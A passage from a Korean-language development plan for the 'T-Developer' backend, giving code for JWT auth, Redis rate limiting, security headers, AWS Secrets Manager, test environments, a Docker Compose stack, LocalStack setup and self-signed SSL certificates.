      expiresIn: this.accessTokenExpiry,
      issuer: 't-developer',
      audience: 'api'
    });
    
    const refreshToken = jwt.sign(
      { userId: payload.userId }, 
      this.refreshTokenSecret, 
      {
        expiresIn: this.refreshTokenExpiry,
        issuer: 't-developer',
        audience: 'refresh'
      }
    );
    
    return { accessToken, refreshToken };
  }
  
  async verifyAccessToken(token: string): Promise<TokenPayload> {
    try {
      return jwt.verify(token, this.accessTokenSecret, {
        issuer: 't-developer',
        audience: 'api'
      }) as TokenPayload;
    } catch (error) {
      throw new Error('Invalid access token');
    }
  }
  
  async verifyRefreshToken(token: string): Promise<{ userId: string }> {
    try {
      return jwt.verify(token, this.refreshTokenSecret, {
        issuer: 't-developer',
        audience: 'refresh'
      }) as { userId: string };
    } catch (error) {
      throw new Error('Invalid refresh token');
    }
  }
  
  async hashPassword(password: string): Promise<string> {
    return bcrypt.hash(password, 12);
  }
  
  async verifyPassword(password: string, hash: string): Promise<boolean> {
    return bcrypt.compare(password, hash);
  }
}
```

### SubTask 0.4.3: API Rate Limiting 설정
**목표**: API 남용 방지를 위한 Rate Limiting

**구현 내용**:
```typescript
// backend/src/middleware/rate-limiter.ts
import { Request, Response, NextFunction } from 'express';
import Redis from 'ioredis';

export interface RateLimitOptions {
  windowMs: number;
  max: number;
  message?: string;
  keyGenerator?: (req: Request) => string;
}

export class RateLimiter {
  private redis: Redis;
  
  constructor() {
    this.redis = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
      password: process.env.REDIS_PASSWORD
    });
  }
  
  middleware(options: RateLimitOptions) {
    const {
      windowMs = 60 * 1000, // 1분
      max = 100,
      message = 'Too many requests',
      keyGenerator = (req) => req.ip
    } = options;
    
    return async (req: Request, res: Response, next: NextFunction) => {
      const key = `rate-limit:${keyGenerator(req)}`;
      const now = Date.now();
      const window = now - windowMs;
      
      try {
        // 시간 window 기반 카운팅
        await this.redis.zremrangebyscore(key, '-inf', window);
        const count = await this.redis.zcard(key);
        
        if (count >= max) {
          return res.status(429).json({
            error: message,
            retryAfter: Math.ceil(windowMs / 1000)
          });
        }
        
        // 요청 기록
        await this.redis.zadd(key, now, `${now}-${Math.random()}`);
        await this.redis.expire(key, Math.ceil(windowMs / 1000));
        
        // 헤더 설정
        res.setHeader('X-RateLimit-Limit', max);
        res.setHeader('X-RateLimit-Remaining', Math.max(0, max - count - 1));
        res.setHeader('X-RateLimit-Reset', new Date(now + windowMs).toISOString());
        
        next();
      } catch (error) {
        console.error('Rate limiter error:', error);
        // Rate limiter 오류 시 요청 통과
        next();
      }
    };
  }
  
  // API별 다른 제한 설정
  apiLimits() {
    return {
      general: this.middleware({ windowMs: 60000, max: 100 }),
      auth: this.middleware({ windowMs: 300000, max: 5 }), // 5분에 5회
      create: this.middleware({ windowMs: 3600000, max: 10 }), // 1시간에 10회
      ai: this.middleware({ windowMs: 60000, max: 20 }) // 1분에 20회
    };
  }
}
```

### SubTask 0.4.4: CORS 및 보안 헤더 설정
**목표**: 웹 보안을 위한 헤더 설정

**구현 내용**:
```typescript
// backend/src/middleware/security.ts
import helmet from 'helmet';
import cors from 'cors';
import { Request, Response, NextFunction } from 'express';

export const securityHeaders = helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "wss:", "https:"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
});

export const corsOptions = cors({
  origin: (origin, callback) => {
    const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [
      'http://localhost:3000',
      'http://localhost:8000'
    ];
    
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  exposedHeaders: ['X-Request-ID', 'X-RateLimit-Limit', 'X-RateLimit-Remaining']
});

// Request ID 미들웨어
export const requestId = (req: Request, res: Response, next: NextFunction) => {
  const id = req.headers['x-request-id'] || `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  req.id = id as string;
  res.setHeader('X-Request-ID', id);
  next();
};

// Security 감사 로깅
export const securityAudit = (req: Request, res: Response, next: NextFunction) => {
  const startTime = Date.now();
  
  res.on('finish', () => {
    const duration = Date.now() - startTime;
    const audit = {
      timestamp: new Date().toISOString(),
      requestId: req.id,
      method: req.method,
      path: req.path,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      statusCode: res.statusCode,
      duration
    };
    
    if (res.statusCode >= 400) {
      console.warn('Security audit:', audit);
    }
  });
  
  next();
};
```

### SubTask 0.4.5: Secrets Manager 통합
**목표**: AWS Secrets Manager를 통한 시크릿 관리

**구현 내용**:
```typescript
// backend/src/config/secrets-manager.ts
import { 
  SecretsManagerClient, 
  GetSecretValueCommand,
  CreateSecretCommand,
  UpdateSecretCommand 
} from '@aws-sdk/client-secrets-manager';

export class SecretsManager {
  private client: SecretsManagerClient;
  private cache: Map<string, { value: any; expiry: number }> = new Map();
  private cacheTTL = 300000; // 5분
  
  constructor() {
    this.client = new SecretsManagerClient({
      region: process.env.AWS_REGION || 'us-east-1'
    });
  }
  
  async getSecret(secretName: string): Promise<any> {
    // 캐시 확인
    const cached = this.cache.get(secretName);
    if (cached && cached.expiry > Date.now()) {
      return cached.value;
    }
    
    try {
      const command = new GetSecretValueCommand({ SecretId: secretName });
      const response = await this.client.send(command);
      
      let secretValue: any;
      if (response.SecretString) {
        secretValue = JSON.parse(response.SecretString);
      } else if (response.SecretBinary) {
        const buff = Buffer.from(response.SecretBinary);
        secretValue = buff.toString('utf-8');
      }
      
      // 캐시에 저장
      this.cache.set(secretName, {
        value: secretValue,
        expiry: Date.now() + this.cacheTTL
      });
      
      return secretValue;
    } catch (error) {
      console.error(`Failed to retrieve secret ${secretName}:`, error);
      throw error;
    }
  }
  
  async createOrUpdateSecret(secretName: string, secretValue: any): Promise<void> {
    const secretString = typeof secretValue === 'string' 
      ? secretValue 
      : JSON.stringify(secretValue);
    
    try {
      // 먼저 업데이트 시도
      const updateCommand = new UpdateSecretCommand({
        SecretId: secretName,
        SecretString: secretString
      });
      await this.client.send(updateCommand);
      console.log(`✅ Secret updated: ${secretName}`);
    } catch (error: any) {
      if (error.name === 'ResourceNotFoundException') {
        // 없으면 생성
        const createCommand = new CreateSecretCommand({
          Name: secretName,
          SecretString: secretString,
          Description: `T-Developer secret: ${secretName}`
        });
        await this.client.send(createCommand);
        console.log(`✅ Secret created: ${secretName}`);
      } else {
        throw error;
      }
    }
    
    // 캐시 무효화
    this.cache.delete(secretName);
  }
  
  // 환경별 시크릿 로드
  async loadEnvironmentSecrets(): Promise<void> {
    const environment = process.env.NODE_ENV || 'development';
    const secretName = `t-developer/${environment}/config`;
    
    try {
      const secrets = await this.getSecret(secretName);
      
      // 환경 변수로 설정
      Object.entries(secrets).forEach(([key, value]) => {
        if (!process.env[key]) {
          process.env[key] = value as string;
        }
      });
      
      console.log(`✅ Loaded secrets for ${environment} environment`);
    } catch (error) {
      console.warn(`⚠️  No secrets found for ${environment}, using local .env`);
    }
  }
}

// 초기화 스크립트
export async function initializeSecrets(): Promise<void> {
  const manager = new SecretsManager();
  
  if (process.env.NODE_ENV === 'production') {
    await manager.loadEnvironmentSecrets();
  }
}
```

**🔧 사용자 작업**:
- AWS Secrets Manager에서 시크릿 생성
- 개발/스테이징/프로덕션 환경별 시크릿 설정
- IAM 권한에 Secrets Manager 읽기 권한 추가

---

## Task 0.5: 테스트 환경 구축

### SubTask 0.5.1: 단위 테스트 헬퍼 생성
**목표**: 테스트 작성을 위한 유틸리티 함수

**구현 내용**:
```typescript
// backend/tests/helpers/test-utils.ts
import { DynamoDBClient } from '@aws-sdk/client-dynamodb';
import { DynamoDBDocumentClient } from '@aws-sdk/lib-dynamodb';
import { mockClient } from 'aws-sdk-client-mock';
import { jest } from '@jest/globals';

// DynamoDB Mock
export const dynamoDBMock = mockClient(DynamoDBDocumentClient);

// 테스트 데이터 생성기
export class TestDataGenerator {
  static project(overrides?: Partial<any>) {
    return {
      id: `proj_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      userId: 'user_test_123',
      name: 'Test Project',
      description: 'A test project description',
      status: 'analyzing',
      createdAt: new Date().toISOString(),
      ...overrides
    };
  }
  
  static agentExecution(overrides?: Partial<any>) {
    return {
      id: `exec_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      projectId: 'proj_test_123',
      agentName: 'TestAgent',
      agentType: 'test',
      status: 'completed',
      startedAt: new Date().toISOString(),
      completedAt: new Date().toISOString(),
      ...overrides
    };
  }
  
  static user(overrides?: Partial<any>) {
    return {
      id: `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      email: 'test@example.com',
      role: 'user',
      createdAt: new Date().toISOString(),
      ...overrides
    };
  }
}

// 비동기 테스트 헬퍼
export async function waitFor(
  condition: () => boolean | Promise<boolean>,
  timeout = 5000,
  interval = 100
): Promise<void> {
  const startTime = Date.now();
  
  while (Date.now() - startTime < timeout) {
    if (await condition()) {
      return;
    }
    await new Promise(resolve => setTimeout(resolve, interval));
  }
  
  throw new Error('Timeout waiting for condition');
}

// Mock 타이머 헬퍼
export class MockTimer {
  private timers: NodeJS.Timer[] = [];
  
  setTimeout(fn: Function, delay: number): NodeJS.Timer {
    const timer = setTimeout(fn, delay);
    this.timers.push(timer);
    return timer;
  }
  
  clearAll(): void {
    this.timers.forEach(timer => clearTimeout(timer));
    this.timers = [];
  }
}

// 환경 변수 모킹
export function mockEnvironment(vars: Record<string, string>): () => void {
  const original = { ...process.env };
  
  Object.entries(vars).forEach(([key, value]) => {
    process.env[key] = value;
  });
  
  return () => {
    process.env = original;
  };
}
```

### SubTask 0.5.2: 통합 테스트 설정
**목표**: API 통합 테스트 환경 구축

**구현 내용**:
```typescript
// backend/tests/helpers/test-server.ts
import express, { Express } from 'express';
import { Server } from 'http';
import { AddressInfo } from 'net';

export class TestServer {
  private app: Express;
  private server?: Server;
  
  constructor() {
    this.app = express();
    this.setupMiddleware();
  }
  
  private setupMiddleware(): void {
    this.app.use(express.json());
    this.app.use(express.urlencoded({ extended: true }));
  }
  
  async start(): Promise<number> {
    return new Promise((resolve) => {
      this.server = this.app.listen(0, () => {
        const port = (this.server!.address() as AddressInfo).port;
        resolve(port);
      });
    });
  }
  
  async stop(): Promise<void> {
    return new Promise((resolve, reject) => {
      if (this.server) {
        this.server.close((err) => {
          if (err) reject(err);
          else resolve();
        });
      } else {
        resolve();
      }
    });
  }
  
  getApp(): Express {
    return this.app;
  }
  
  getUrl(port: number): string {
    return `http://localhost:${port}`;
  }
}

// API 테스트 클라이언트
export class TestClient {
  constructor(private baseURL: string) {}
  
  async get(path: string, headers?: Record<string, string>) {
    const response = await fetch(`${this.baseURL}${path}`, {
      method: 'GET',
      headers
    });
    return {
      status: response.status,
      body: await response.json()
    };
  }
  
  async post(path: string, data?: any, headers?: Record<string, string>) {
    const response = await fetch(`${this.baseURL}${path}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...headers
      },
      body: JSON.stringify(data)
    });
    return {
      status: response.status,
      body: await response.json()
    };
  }
}
```

### SubTask 0.5.3: E2E 테스트 환경
**목표**: End-to-End 테스트를 위한 환경 구성

**구현 내용**:
```typescript
// backend/tests/e2e/setup.ts
import { spawn, ChildProcess } from 'child_process';
import { DynamoDBClient, CreateTableCommand } from '@aws-sdk/client-dynamodb';

export class E2ETestEnvironment {
  private processes: ChildProcess[] = [];
  private dynamoClient: DynamoDBClient;
  
  constructor() {
    this.dynamoClient = new DynamoDBClient({
      endpoint: 'http://localhost:8000',
      region: 'us-east-1',
      credentials: {
        accessKeyId: 'test',
        secretAccessKey: 'test'
      }
    });
  }
  
  async setup(): Promise<void> {
    console.log('🔧 Setting up E2E test environment...');
    
    // 1. DynamoDB Local 시작
    await this.startDynamoDBLocal();
    
    // 2. Redis 시작
    await this.startRedis();
    
    // 3. 테스트 테이블 생성
    await this.createTestTables();
    
    // 4. 애플리케이션 서버 시작
    await this.startAppServer();
    
    console.log('✅ E2E test environment ready!');
  }
  
  async teardown(): Promise<void> {
    console.log('🧹 Cleaning up E2E test environment...');
    
    // 모든 프로세스 종료
    this.processes.forEach(process => {
      process.kill('SIGTERM');
    });
    
    // 프로세스 종료 대기
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    console.log('✅ E2E test environment cleaned up!');
  }
  
  private async startDynamoDBLocal(): Promise<void> {
    const dynamodb = spawn('docker', [
      'run',
      '--rm',
      '-p', '8000:8000',
      'amazon/dynamodb-local',
      '-jar', 'DynamoDBLocal.jar',
      '-inMemory'
    ]);
    
    this.processes.push(dynamodb);
    
    // DynamoDB 시작 대기
    await this.waitForPort(8000, 10000);
  }
  
  private async startRedis(): Promise<void> {
    const redis = spawn('docker', [
      'run',
      '--rm',
      '-p', '6379:6379',
      'redis:7-alpine'
    ]);
    
    this.processes.push(redis);
    
    // Redis 시작 대기
    await this.waitForPort(6379, 10000);
  }
  
  private async createTestTables(): Promise<void> {
    const tables = [
      {
        TableName: 'test-projects',
        KeySchema: [{ AttributeName: 'id', KeyType: 'HASH' }],
        AttributeDefinitions: [{ AttributeName: 'id', AttributeType: 'S' }],
        BillingMode: 'PAY_PER_REQUEST'
      }
    ];
    
    for (const table of tables) {
      try {
        await this.dynamoClient.send(new CreateTableCommand(table));
      } catch (error: any) {
        if (error.name !== 'ResourceInUseException') {
          throw error;
        }
      }
    }
  }
  
  private async startAppServer(): Promise<void> {
    const app = spawn('npm', ['run', 'start:test'], {
      env: {
        ...process.env,
        NODE_ENV: 'test',
        PORT: '8080'
      }
    });
    
    this.processes.push(app);
    
    // 앱 서버 시작 대기
    await this.waitForPort(8080, 30000);
  }
  
  private async waitForPort(port: number, timeout: number): Promise<void> {
    const startTime = Date.now();
    
    while (Date.now() - startTime < timeout) {
      try {
        const response = await fetch(`http://localhost:${port}`);
        if (response.ok || response.status === 404) {
          return;
        }
      } catch (error) {
        // 연결 실패, 재시도
      }
      
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    throw new Error(`Port ${port} did not become available within ${timeout}ms`);
  }
}
```

### SubTask 0.5.4: 테스트 데이터 시더
**목표**: 테스트용 초기 데이터 생성

**구현 내용**:
```typescript
// backend/tests/fixtures/seed-data.ts
import { DynamoDBDocumentClient, PutCommand, BatchWriteCommand } from '@aws-sdk/lib-dynamodb';
import { faker } from '@faker-js/faker';

export class TestDataSeeder {
  constructor(private docClient: DynamoDBDocumentClient) {}
  
  async seedAll(): Promise<void> {
    await Promise.all([
      this.seedUsers(),
      this.seedProjects(),
      this.seedComponents()
    ]);
  }
  
  async seedUsers(count: number = 10): Promise<void> {
    const users = Array.from({ length: count }, () => ({
      id: `user_${faker.string.uuid()}`,
      email: faker.internet.email(),
      name: faker.person.fullName(),
      role: faker.helpers.arrayElement(['user', 'admin']),
      apiKey: `sk_test_${faker.string.alphanumeric(32)}`,
      createdAt: faker.date.past().toISOString()
    }));
    
    for (const user of users) {
      await this.docClient.send(new PutCommand({
        TableName: 'test-users',
        Item: user
      }));
    }
    
    console.log(`✅ Seeded ${count} test users`);
  }
  
  async seedProjects(count: number = 20): Promise<void> {
    const projects = Array.from({ length: count }, () => ({
      id: `proj_${faker.string.uuid()}`,
      userId: `user_${faker.string.uuid()}`,
      name: faker.commerce.productName(),
      description: faker.lorem.paragraph(),
      projectType: faker.helpers.arrayElement(['web', 'api', 'mobile']),
      status: faker.helpers.arrayElement(['analyzing', 'building', 'completed']),
      uiFramework: faker.helpers.arrayElement(['react', 'vue', 'angular']),
      createdAt: faker.date.past().toISOString()
    }));
    
    // 배치 쓰기 (25개씩)
    const chunks = this.chunkArray(projects, 25);
    
    for (const chunk of chunks) {
      await this.docClient.send(new BatchWriteCommand({
        RequestItems: {
          'test-projects': chunk.map(item => ({
            PutRequest: { Item: item }
          }))
        }
      }));
    }
    
    console.log(`✅ Seeded ${count} test projects`);
  }
  
  async seedComponents(count: number = 50): Promise<void> {
    const components = Array.from({ length: count }, () => ({
      id: `comp_${faker.string.uuid()}`,
      name: faker.hacker.noun(),
      version: faker.system.semver(),
      language: faker.helpers.arrayElement(['javascript', 'typescript', 'python']),
      framework: faker.helpers.arrayElement(['react', 'express', 'fastapi']),
      description: faker.lorem.sentence(),
      downloads: faker.number.int({ min: 0, max: 1000000 }),
      stars: faker.number.int({ min: 0, max: 50000 }),
      lastUpdated: faker.date.recent().toISOString()
    }));
    
    const chunks = this.chunkArray(components, 25);
    
    for (const chunk of chunks) {
      await this.docClient.send(new BatchWriteCommand({
        RequestItems: {
          'test-components': chunk.map(item => ({
            PutRequest: { Item: item }
          }))
        }
      }));
    }
    
    console.log(`✅ Seeded ${count} test components`);
  }
  
  private chunkArray<T>(array: T[], size: number): T[][] {
    const chunks: T[][] = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }
}
```

### SubTask 0.5.5: 테스트 실행 스크립트
**목표**: 다양한 테스트 시나리오 실행 스크립트

**구현 내용**:
```json
// backend/package.json (scripts 섹션 추가)
{
  "scripts": {
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:unit": "jest --testPathPattern=unit",
    "test:integration": "jest --testPathPattern=integration",
    "test:e2e": "jest --testPathPattern=e2e --runInBand",
    "test:e2e:setup": "ts-node tests/e2e/setup.ts",
    "test:seed": "ts-node tests/fixtures/seed-data.ts",
    "test:all": "npm run test:unit && npm run test:integration && npm run test:e2e"
  }
}
```

```bash
#!/bin/bash
# scripts/run-tests.sh

#!/bin/bash
set -e

echo "🧪 T-Developer 테스트 실행"
echo "=========================="

# 환경 변수 설정
export NODE_ENV=test
export AWS_REGION=us-east-1
export DYNAMODB_ENDPOINT=http://localhost:8000

# 테스트 타입 선택
if [ "$1" == "unit" ]; then
    echo "🔬 단위 테스트 실행..."
    npm run test:unit
elif [ "$1" == "integration" ]; then
    echo "🔗 통합 테스트 실행..."
    npm run test:integration
elif [ "$1" == "e2e" ]; then
    echo "🌐 E2E 테스트 실행..."
    npm run test:e2e:setup
    npm run test:e2e
elif [ "$1" == "all" ]; then
    echo "📊 전체 테스트 실행..."
    npm run test:all
else
    echo "사용법: ./run-tests.sh [unit|integration|e2e|all]"
    exit 1
fi

echo "✅ 테스트 완료!"
```

**🔧 사용자 작업**:
- 테스트 스크립트 실행 권한: `chmod +x scripts/run-tests.sh`
- 단위 테스트 실행: `./scripts/run-tests.sh unit`
- 전체 테스트 실행: `./scripts/run-tests.sh all`

---

### SubTask 0.5.6: 테스트 보고서 생성 설정
**목표**: 테스트 결과를 시각적으로 보여주는 리포트 설정

**구현 내용**:
```typescript
// backend/jest-html-reporter.config.js
module.exports = {
  pageTitle: 'T-Developer Test Report',
  outputPath: 'test-reports/index.html',
  includeFailureMsg: true,
  includeConsoleLog: true,
  dateFormat: 'yyyy-mm-dd HH:MM:ss',
  theme: 'darkTheme',
  logo: './assets/logo.png',
  customCss: './test-reports/custom.css',
  executionTimeWarningThreshold: 5000,
  
  // 커스텀 정보 추가
  customInfos: [
    {label: 'Environment', value: process.env.NODE_ENV || 'test'},
    {label: 'Node Version', value: process.version},
    {label: 'Test Runner', value: 'Jest'}
  ]
};
```

```typescript
// backend/src/utils/test-reporter.ts
import { writeFileSync, mkdirSync } from 'fs';
import { join } from 'path';

export class CustomTestReporter {
  private results: any[] = [];
  
  onRunStart() {
    this.results = [];
    console.log('🧪 테스트 실행 시작...');
  }
  
  onTestResult(test: any, testResult: any) {
    this.results.push({
      testPath: test.path,
      duration: testResult.perfStats.runtime,
      passed: testResult.numFailingTests === 0,
      coverage: testResult.coverage
    });
  }
  
  onRunComplete(contexts: any, results: any) {
    const report = {
      startTime: results.startTime,
      endTime: Date.now(),
      duration: Date.now() - results.startTime,
      numTotalTests: results.numTotalTests,
      numPassedTests: results.numPassedTests,
      numFailedTests: results.numFailedTests,
      numPendingTests: results.numPendingTests,
      testResults: this.results,
      coverage: results.coverageMap
    };
    
    // 리포트 디렉토리 생성
    const reportDir = join(process.cwd(), 'test-reports');
    mkdirSync(reportDir, { recursive: true });
    
    // JSON 리포트 저장
    writeFileSync(
      join(reportDir, 'test-results.json'),
      JSON.stringify(report, null, 2)
    );
    
    // 간단한 요약 출력
    console.log('\n📊 테스트 결과 요약:');
    console.log(`✅ 성공: ${results.numPassedTests}`);
    console.log(`❌ 실패: ${results.numFailedTests}`);
    console.log(`⏭️  스킵: ${results.numPendingTests}`);
    console.log(`⏱️  시간: ${(report.duration / 1000).toFixed(2)}초`);
  }
}
```

---

## Task 0.6: 로컬 개발 인프라 구성

### SubTask 0.6.1: Docker Compose 전체 설정
**목표**: 완전한 로컬 개발 환경을 위한 Docker 구성

**구현 내용**:
```yaml
# docker-compose.yml
version: '3.8'

services:
  # DynamoDB Local
  dynamodb:
    image: amazon/dynamodb-local:latest
    container_name: t-developer-dynamodb
    ports:
      - "8000:8000"
    command: "-jar DynamoDBLocal.jar -sharedDb -inMemory"
    networks:
      - t-developer-network

  # Redis
  redis:
    image: redis:7-alpine
    container_name: t-developer-redis
    ports:
      - "6379:6379"
    command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD:-devpassword}
    volumes:
      - redis-data:/data
    networks:
      - t-developer-network

  # LocalStack (AWS 서비스 모킹)
  localstack:
    image: localstack/localstack:latest
    container_name: t-developer-localstack
    ports:
      - "4566:4566"
      - "4571:4571"
    environment:
      - SERVICES=s3,lambda,secretsmanager,cloudwatch
      - DEBUG=1
      - LAMBDA_EXECUTOR=docker
      - DOCKER_HOST=unix:///var/run/docker.sock
    volumes:
      - "/var/run/docker.sock:/var/run/docker.sock"
      - localstack-data:/tmp/localstack
    networks:
      - t-developer-network

  # Postgres (선택적 - DynamoDB 대신 사용 가능)
  postgres:
    image: postgres:15-alpine
    container_name: t-developer-postgres
    ports:
      - "5432:5432"
    environment:
      POSTGRES_DB: t_developer
      POSTGRES_USER: ${DB_USER:-developer}
      POSTGRES_PASSWORD: ${DB_PASSWORD:-devpassword}
    volumes:
      - postgres-data:/var/lib/postgresql/data
    networks:
      - t-developer-network

  # Elasticsearch (컴포넌트 검색용)
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
    container_name: t-developer-elasticsearch
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    ports:
      - "9200:9200"
    volumes:
      - elasticsearch-data:/usr/share/elasticsearch/data
    networks:
      - t-developer-network

  # Kibana (Elasticsearch UI)
  kibana:
    image: docker.elastic.co/kibana/kibana:8.11.0
    container_name: t-developer-kibana
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    depends_on:
      - elasticsearch
    networks:
      - t-developer-network

  # Jaeger (분산 추적)
  jaeger:
    image: jaegertracing/all-in-one:latest
    container_name: t-developer-jaeger
    ports:
      - "16686:16686"
      - "14268:14268"
    environment:
      - COLLECTOR_ZIPKIN_HOST_PORT=:9411
    networks:
      - t-developer-network

volumes:
  redis-data:
  localstack-data:
  postgres-data:
  elasticsearch-data:

networks:
  t-developer-network:
    driver: bridge
```

**🔧 사용자 작업**:
- Docker Desktop 메모리 할당 확인 (최소 4GB)
- `docker-compose up -d` 실행
- 모든 서비스 health check 확인

### SubTask 0.6.2: LocalStack AWS 서비스 초기화
**목표**: LocalStack에서 필요한 AWS 서비스 설정

**구현 내용**:
```python
# scripts/setup-localstack.py
import boto3
import json
import time
from botocore.config import Config

# LocalStack 설정
config = Config(
    region_name='us-east-1',
    retries={'max_attempts': 10, 'mode': 'standard'}
)

# LocalStack 엔드포인트
LOCALSTACK_URL = 'http://localhost:4566'

def create_s3_buckets():
    """S3 버킷 생성"""
    s3 = boto3.client('s3', endpoint_url=LOCALSTACK_URL, config=config)
    
    buckets = [
        't-developer-artifacts',
        't-developer-components',
        't-developer-templates',
        't-developer-test-data'
    ]
    
    for bucket in buckets:
        try:
            s3.create_bucket(Bucket=bucket)
            print(f"✅ S3 버킷 생성: {bucket}")
            
            # 버킷 정책 설정
            bucket_policy = {
                "Version": "2012-10-17",
                "Statement": [{
                    "Effect": "Allow",
                    "Principal": "*",
                    "Action": "s3:GetObject",
                    "Resource": f"arn:aws:s3:::{bucket}/*"
                }]
            }
            s3.put_bucket_policy(
                Bucket=bucket,
                Policy=json.dumps(bucket_policy)
            )
        except Exception as e:
            print(f"⚠️  버킷 생성 실패 {bucket}: {e}")

def create_lambda_functions():
    """Lambda 함수 스텁 생성"""
    lambda_client = boto3.client('lambda', endpoint_url=LOCALSTACK_URL, config=config)
    
    functions = [
        {
            'FunctionName': 't-developer-nl-processor',
            'Runtime': 'nodejs18.x',
            'Role': 'arn:aws:iam::123456789012:role/lambda-role',
            'Handler': 'index.handler',
            'Code': {'ZipFile': b'exports.handler = async (event) => { return { statusCode: 200, body: "OK" }; };'},
            'Timeout': 300,
            'MemorySize': 512
        }
    ]
    
    for func in functions:
        try:
            lambda_client.create_function(**func)
            print(f"✅ Lambda 함수 생성: {func['FunctionName']}")
        except Exception as e:
            print(f"⚠️  Lambda 생성 실패: {e}")

def create_secrets():
    """Secrets Manager 시크릿 생성"""
    sm = boto3.client('secretsmanager', endpoint_url=LOCALSTACK_URL, config=config)
    
    secrets = {
        't-developer/dev/api-keys': {
            'OPENAI_API_KEY': 'sk-test-xxx',
            'ANTHROPIC_API_KEY': 'sk-ant-test-xxx'
        },
        't-developer/dev/database': {
            'DB_HOST': 'localhost',
            'DB_PORT': '5432',
            'DB_NAME': 't_developer',
            'DB_USER': 'developer',
            'DB_PASSWORD': 'devpassword'
        }
    }
    
    for secret_name, secret_value in secrets.items():
        try:
            sm.create_secret(
                Name=secret_name,
                SecretString=json.dumps(secret_value)
            )
            print(f"✅ Secret 생성: {secret_name}")
        except Exception as e:
            print(f"⚠️  Secret 생성 실패: {e}")

def setup_cloudwatch():
    """CloudWatch 로그 그룹 생성"""
    logs = boto3.client('logs', endpoint_url=LOCALSTACK_URL, config=config)
    
    log_groups = [
        '/aws/lambda/t-developer-agents',
        '/aws/ecs/t-developer-api',
        '/t-developer/application'
    ]
    
    for log_group in log_groups:
        try:
            logs.create_log_group(logGroupName=log_group)
            print(f"✅ 로그 그룹 생성: {log_group}")
        except Exception as e:
            print(f"⚠️  로그 그룹 생성 실패: {e}")

def main():
    print("🚀 LocalStack 초기화 시작...")
    
    # LocalStack이 준비될 때까지 대기
    time.sleep(5)
    
    create_s3_buckets()
    create_lambda_functions()
    create_secrets()
    setup_cloudwatch()
    
    print("\n✅ LocalStack 초기화 완료!")
    print("📋 사용 가능한 서비스:")
    print("- S3: http://localhost:4566")
    print("- Lambda: http://localhost:4566")
    print("- Secrets Manager: http://localhost:4566")
    print("- CloudWatch: http://localhost:4566")

if __name__ == "__main__":
    main()
```

### SubTask 0.6.3: 개발용 SSL 인증서 생성
**목표**: HTTPS 로컬 개발을 위한 자체 서명 인증서

**구현 내용**:
```bash
#!/bin/bash
# scripts/generate-ssl-certs.sh

CERT_DIR="./certs"
DOMAIN="localhost"

# 인증서 디렉토리 생성
mkdir -p $CERT_DIR

# Root CA 생성
openssl genrsa -out $CERT_DIR/rootCA.key 2048
openssl req -x509 -new -nodes -key $CERT_DIR/rootCA.key -sha256 -days 365 \
    -out $CERT_DIR/rootCA.crt \
    -subj "/C=US/ST=State/L=City/O=T-Developer/CN=T-Developer Root CA"

# 서버 키 생성
openssl genrsa -out $CERT_DIR/server.key 2048

# 인증서 요청 생성
openssl req -new -key $CERT_DIR/server.key -out $CERT_DIR/server.csr \
    -subj "/C=US/ST=State/L=City/O=T-Developer/CN=$DOMAIN"

# SAN 설정 파일 생성
cat > $CERT_DIR/server.conf <<EOF
[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req

[req_distinguished_name]

[v3_req]
subjectAltName = @alt_names

[alt_names]
DNS.1 = localhost
DNS.2 = *.localhost
IP.1 = 127.0.0.1
IP.2 = ::1
EOF

# 서버 인증서 생성
openssl x509 -req -in $CERT_DIR/server.csr -CA $CERT_DIR/rootCA.crt \
    -CAkey $CERT_DIR/rootCA.key -CAcreateserial \
    -out $CERT_DIR/server.crt -days 365 -sha256 \
    -extfile $CERT_DIR/server.conf -extensions v3_req

# PEM 형식으로 변환
cat $CERT_DIR/server.crt $CERT_DIR/server.key > $CERT_DIR/server.pem

echo "✅ SSL 인증서 생성 완료!"
echo "📁 인증서 위치: $CERT_DIR/"
echo "🔐 Root CA를 시스템에 신뢰할 인증서로 추가하세요:"
echo "   - macOS: sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain $CERT_DIR/rootCA.crt"
echo "   - Ubuntu: sudo cp $CERT_DIR/rootCA.crt /usr/local/share/ca-certificates/ && sudo update-ca-certificates"
```

```typescript
// backend/src/config/https-server.ts
import https from 'https';
import fs from 'fs';
import path from 'path';
import express from 'express';

export function createHttpsServer(app: express.Application) {
  const certPath = path.join(process.cwd(), 'certs');
  
  const options = {
    key: fs.readFileSync(path.join(certPath, 'server.key')),
    cert: fs.readFileSync(path.join(certPath, 'server.crt'))
  };
  
  return https.createServer(options, app);
}

// 개발 환경에서 HTTPS 사용
